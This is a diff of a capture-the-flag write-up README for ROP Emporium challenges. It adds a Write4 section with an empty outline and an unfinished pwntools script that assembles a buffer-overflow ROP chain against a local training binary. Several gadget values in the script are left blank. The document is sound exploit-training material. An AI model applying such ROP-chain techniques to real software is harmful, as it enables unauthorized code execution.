@@ -3,11 +3,11 @@
 ***
 
 | Challenge          | Walkthrough                                                                                     |
-| ------------       | --------                                                                                        |
+| ------------------ | ------------------------------------------------------------------------------------------------|
 | [Ret2Win](#ret2win)| [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Ret2win64.pdf)|
 | [Split](#split)    | [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Split64.pdf)  |                                                         
 | [CallMe](#callme)  | [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Callme64.pdf) |
-| Write4             | pdf                                                                                                |
+| [Write4](#write4)  | [pdf](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/ROP_Emporium/Writeups/Write4.pdf)   |
 
 ***
 
@@ -113,7 +113,7 @@ print(flag)
 
 ***
 
-## CallMe 64 bit<a name="callme"></a>
+## CALLME 64 bit<a name="callme"></a>
 
 > ## 1. Problem
 >> In order to get the flag in the callme challenge, there are 3 functions that need
@@ -183,3 +183,62 @@ print(flag)                           # print flag!
 **FLAG:**  *ROPE{a_placeholder_32byte_flag!}* 
 
 ***
+
+## WRITE4 64 bit<a name="write4"></a>
+
+> ## 1. Problem
+>>
+>>
+
+> ## 2. Solution
+>>
+>>
+>> - [ ] 
+>>>
+>>>
+>> - [ ]
+>>>
+>>>
+>> - [ ]
+>>>
+>>>
+
+~~~python
+
+#!/usr/bin/env python
+
+from pwn import *
+
+elf = context.binary = ELF('write')  # setting up the envronment
+context.log_level = 'debug'       
+
+padding = cyclic(40)
+rop1 = 
+rop2 = 
+move_addr = 
+addr_location = 
+print_file = 
+string =
+
+payload = padding                    # start of ROP Chain
+payload += rop1
+payload += addr_location
+payload += string
+payload += move_addr
+payload += rop2
+payload += addr_location
+payload += print_file                # end of ROP chain
+
+io = process(elf.path)
+io.sendline(payload)                 # sends payload
+io.wait_for_close()                  
+flag = io.recvall()
+print(flag)
+
+~~~
+
+**FLAG:**  *ROPE{a_placeholder_32byte_flag!}* 
+
+***
+
+~~~
